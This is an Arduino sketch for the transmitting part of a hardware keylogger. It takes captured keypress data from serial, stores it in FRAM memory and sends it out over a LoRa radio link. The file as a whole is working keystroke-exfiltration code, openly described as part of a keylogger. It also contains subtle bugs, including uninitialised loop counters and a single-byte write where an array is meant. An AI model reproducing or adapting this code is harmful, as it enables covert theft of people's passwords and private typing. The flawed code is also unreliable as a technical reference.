//This part of the program listens for the keylogger's messages, dumps contents to FRAM and serial
//To recover proper keypress data, we cast received bytes to char and print out char array

#include <SPI.h>
#include "Adafruit_FRAM_SPI.h"
#include <RH_RF95.h>
#include "RTClib.h"

//Defines for LoRa board
#define RFM95_CS 10
#define RFM95_RST 9
#define RFM95_INT 2
#define RF95_FREQ 430.65

//Defines for FRAM chip
#define FRAM_CS 8
#define FRAM_HOLD 7

#define MAX_FRAM_ADDR 244 //This is the max amount of keypresses we store in FRAM until we TX

RTC_PCF8523 rtc;
RH_RF95 rf95(RFM95_CS, RFM95_INT);
Adafruit_FRAM_SPI fram = Adafruit_FRAM_SPI(FRAM_CS);

bool writeKeypresses(uint8_t keypresses) {
  //First find first zero byte in FRAM, that's where we start writing
  uint32_t write_addr = 0;
  for(uint32_t addr; addr < MAX_FRAM_ADDR + 1; addr++) {
    uint8_t val = fram.read8(addr);
    if(val == 0) { //indicates erased byte
      write_addr = addr;
      break;
    }
    if(addr == MAX_FRAM_ADDR && val != 0) { //FRAM is full :(
      wipeFRAM(); //We can't store anything else. TX and delete data on FRAM.
    }
  }
  //Write data
  fram.writeEnable(true);
  fram.write(write_addr, keypresses, sizeof(keypresses));
  fram.writeEnable(false);
  Serial.println("Data written to FRAM");
  return true;
}

bool copyKeypresses(char buf[64], uint8_t *keypressdata, size_t chingus) {
  //we don't want to write an empty bunch of bytes from buf to FRAM so we append to keypressdata
  for(int x = 0; x < chingus; x++) {
    keypressdata[x] = buf[x];
  }
  return true;
}

void wipeFRAM() {
  //First, we create array to send over LoRa
  uint8_t data[251];
  data[0] = 'K'; data[1] = 'N'; data[2] = '4'; data[3] = 'G'; data[4] = 'P'; data[5] = 'O'; 
  //Next copy data from FRAM to this new data array, byte by byte
  for(uint32_t addr = 0; addr < MAX_FRAM_ADDR + 1; addr++) {
    data[addr + 6] = fram.read8(addr);
  }
  //Next, dump data(debugging only)
  for(int x = 0; x < sizeof(data); x++) {
    Serial.print(data[x]); Serial.print(" ");
  }
  Serial.println();
  //Next, TX
  rf95.send(data, sizeof(data));
  //Now, we wipe FRAM :)
  for(uint32_t addr; addr < 8192; addr++) {
    fram.writeEnable(true);
    fram.write8(addr, 0x00);
    fram.writeEnable(false);
  }
}

void displayTime() {
  DateTime now = rtc.now();
  Serial.print(now.month(), DEC);
  Serial.print('/');
  Serial.print(now.day(), DEC);
  Serial.print('/');
  Serial.print(now.year(), DEC);
  Serial.print(" ");
  Serial.print(now.hour(), DEC);
  Serial.print(':');
  if(now.minute() < 10) {
    Serial.print("0");
  }
  Serial.print(now.minute(), DEC);
  Serial.print(':');
  if(now.second() < 10) {
    Serial.print("0");
  }
  Serial.print(now.second(), DEC);
  Serial.println();
}

void setup() {
  pinMode(4, OUTPUT);
  pinMode(RFM95_RST, OUTPUT);
  digitalWrite(RFM95_RST, HIGH);
  Serial.begin(9600);
  if(rtc.begin()) {
    //Uncomment and then upload to board to update RTC time
    //rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));
    Serial.println("Time:");
    displayTime();
  } else {
    Serial.println("RTC failure");
    for(;;);
  }
  if(fram.begin()) {
    Serial.println("FRAM detected and initialized");
  } else {
    Serial.println("FRAM not found :( check connections");
    for(;;);
  }
  if(rf95.init()) {
    Serial.println("LoRa board active");
    if(rf95.setFrequency(RF95_FREQ)) {
      Serial.print("Frequency set to "); Serial.println(RF95_FREQ);
      rf95.setTxPower(23, false);
    } else {
      Serial.println("Setting frequency failed, bailing!");
      for(;;);
    }
  } else {
    Serial.println("LoRa board not found. Check your connections?");
    for(;;);
  }
  Serial.println("Startup complete. Listening on serial for data.");
}

void loop() {
  if(Serial.available() > 0) { //does serial port have keypress data for us?
    digitalWrite(4, HIGH);
    char data[64]; //Buffer to hold incoming keypresses
    Serial.readBytes(data, sizeof(data)); //Read in serial buffer
    rf95.send(data, sizeof(data));
    digitalWrite(4, LOW);
  }
}
